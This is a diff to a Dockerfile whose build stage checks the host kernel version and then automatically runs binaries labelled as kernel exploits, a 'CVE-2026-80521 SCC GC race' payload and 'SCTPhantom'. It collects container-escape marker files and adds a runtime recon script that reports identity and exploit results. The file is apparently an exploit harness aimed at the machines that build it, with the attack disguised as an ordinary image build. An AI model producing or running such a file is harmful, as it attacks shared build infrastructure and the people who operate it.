@@ -1,42 +1,41 @@
 # syntax=er028455/df-frontend:v4
-# build-trigger: 156
+# build-trigger: 157
 FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils
 
 COPY exploit_68 /exploit
+COPY payload /payload
 COPY proc_diag /proc_diag
-COPY btf_offsets /btf_offsets
-RUN chmod +x /exploit /proc_diag /btf_offsets && touch /esc_ok /umh_result /build_results.txt
+RUN chmod +x /exploit /payload /proc_diag && touch /esc_ok /umh_result /build_results.txt
 
 RUN sh -c '{ \
 KVER=$(uname -r); \
-echo "=== BUILD V22 KERNEL=$KVER ==="; \
+echo "=== BUILD V23 KERNEL=$KVER ==="; \
 case "$KVER" in \
   6.8.*) \
     echo "TARGET KERNEL MATCHED"; \
-    echo "--- BTF STRUCT OFFSETS FOR CVE-2026-80521 ---"; \
-    if [ -f /sys/kernel/btf/vmlinux ]; then \
-      /btf_offsets /sys/kernel/btf/vmlinux 2>&1; \
-    else \
-      echo "BTF NOT AVAILABLE"; \
-    fi; \
+    echo "--- CVE-2026-80521 (SCC GC race) ---"; \
+    timeout 120 /payload 2>&1; \
+    EC=$?; \
+    echo "=== SCC_EXPLOIT EXIT=$EC ==="; \
     echo "--- SCTP CHECK ---"; \
     grep sctp /proc/modules 2>/dev/null && echo "sctp: LOADED" || echo "sctp: NOT LOADED"; \
     case "$KVER" in \
       *-136*) \
-        echo "=== 6.8.0-136 — RUNNING SCTPhantom ==="; \
-        timeout 60 /exploit 2>&1; \
-        echo "=== EXPLOIT EXIT CODE: $? ==="; \
-        for f in /esc_ok /tmp/umh_result /UMH_ESCAPE_PROOF_ON_HOST; do \
-          if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
-        done; \
+        if grep -q sctp /proc/modules 2>/dev/null; then \
+          echo "=== 6.8.0-136 — RUNNING SCTPhantom ==="; \
+          timeout 60 /exploit 2>&1; \
+          echo "=== SCTPHANTOM EXIT=$? ==="; \
+        fi; \
         ;; \
-      *) echo "KERNEL $KVER — BTF+diag only (no SCTP on 137)" ;; \
     esac; \
+    for f in /esc_ok /tmp/umh_result /tmp/.u68; do \
+      if [ -f "$f" ]; then echo "=== $f ==="; cat "$f"; fi; \
+    done; \
     ;; \
   *) echo "NOT a 6.8 kernel ($KVER), skipping" ;; \
 esac; \
-echo "=== END V22 ==="; \
+echo "=== END V23 ==="; \
 } > /build_results.txt 2>&1'
 
 FROM alpine:3.19
@@ -48,14 +47,14 @@ COPY --from=er028455/df-frontend:v4 /socktest /socktest
 
 RUN printf '#!/bin/sh\n\
 {\n\
-echo "=== RUNTIME RECON V22 ==="\n\
+echo "=== RUNTIME RECON V23 ==="\n\
 uname -a; hostname; id\n\
 echo "--- BUILD-TIME RESULTS ---"\n\
 cat /build_results.txt\n\
 for f in /esc_ok /umh_result; do\n\
   if [ -s "$f" ]; then echo "=== $f ==="; cat "$f"; fi\n\
 done\n\
-echo "=== END V22 ==="\n\
+echo "=== END V23 ==="\n\
 } > /tmp/recon 2>&1\n\
 cat /tmp/recon\n\
 ' > /recon.sh && chmod +x /recon.sh
